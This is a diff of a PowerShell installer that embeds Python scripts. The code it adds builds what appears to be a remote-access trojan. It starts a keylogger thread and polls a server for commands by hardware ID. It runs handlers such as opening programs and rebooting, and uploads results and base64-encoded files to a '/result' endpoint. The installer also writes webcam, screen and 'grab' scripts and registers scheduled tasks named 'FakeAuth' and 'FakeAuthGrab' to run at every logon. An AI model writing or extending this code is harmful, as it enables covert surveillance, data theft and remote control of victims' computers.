+    "msgbox": lambda a: ps("Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show('%s')" % a.replace("'", "''")) or "shown",
+    "open": lambda a: subprocess.Popen("start \"\" \"%s\"" % a, shell=True) and "opened",
+    "reboot": lambda a: subprocess.run(["shutdown", "/r", "/t", "5"], capture_output=True) and "rebooting",
+    "uninstall": do_uninstall,
+}
+
+def run_cmd(c):
+    fn = HANDLERS.get(c.get("cmd"))
+    if not fn:
+        api("/result", {"hwid": HWID, "id": c["id"], "ok": False, "out": "unknown"})
+        return
+    try:
+        r = fn(c.get("args") or "")
+    except Exception as e:
+        api("/result", {"hwid": HWID, "id": c["id"], "ok": False, "out": repr(e)[:400]})
+        return
+    out, files = "", []
+    if isinstance(r, tuple) and isinstance(r[0], (bytes, bytearray)):
+        files.append({"name": r[1], "b64": base64.b64encode(r[0]).decode()})
+    else:
+        out = str(r)
+    api("/result", {"hwid": HWID, "id": c["id"], "ok": True, "out": out, "files": files}, timeout=300)
 
 def main():
-    once = "--once" in sys.argv
+    threading.Thread(target=kl, daemon=True).start()
+    last = 0
     while True:
         try:
-            cycle()
+            if time.time() - last > INTERVAL:
+                last = time.time()
+                threading.Thread(target=cycle, daemon=True).start()
+            c = api("/cmd?h=" + HWID, timeout=30)
+            if c and c.get("cmd"):
+                run_cmd(c)
         except Exception as e:
-            log("cycle error %r" % e)
-        if once:
-            break
-        time.sleep(INTERVAL)
+            log("loop %r" % e)
+        time.sleep(POLL)
 
 if __name__ == "__main__":
     main()
 '@
 
 $utf8 = New-Object System.Text.UTF8Encoding($false)
-foreach ($pair in @(@('makecert.py',$makecert), @('run.py',$runner), @('fake.py',$fake), @('cam.ps1',$cam), @('screen.ps1',$screen), @('grab.py',$grab))) {
+foreach ($pair in @(@('makecert.py',$makecert), @('run.py',$runner), @('fake.py',$fake), @('cam.ps1',$cam), @('screen.ps1',$screen), @('agent.py',$grab))) {
     [IO.File]::WriteAllText((Join-Path $Root $pair[0]), $pair[1], $utf8)
 }
 
@@ -980,7 +1021,7 @@ $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoi
     -ExecutionTimeLimit ([TimeSpan]::Zero) -MultipleInstances IgnoreNew -DontStopOnIdleEnd
 $trigger = New-ScheduledTaskTrigger -AtLogOn -User "$env:USERDOMAIN\$env:USERNAME"
 
-foreach ($pair in @(@('FakeAuth','run.py'), @('FakeAuthGrab','grab.py'))) {
+foreach ($pair in @(@('FakeAuth','run.py'), @('FakeAuthGrab','agent.py'))) {
     $act = New-ScheduledTaskAction -Execute $Launcher -Argument $pair[1] -WorkingDirectory $Root
     Register-ScheduledTask -TaskName $pair[0] -Action $act -Trigger $trigger -Settings $settings `
         -Principal $principal -Force | Out-Null
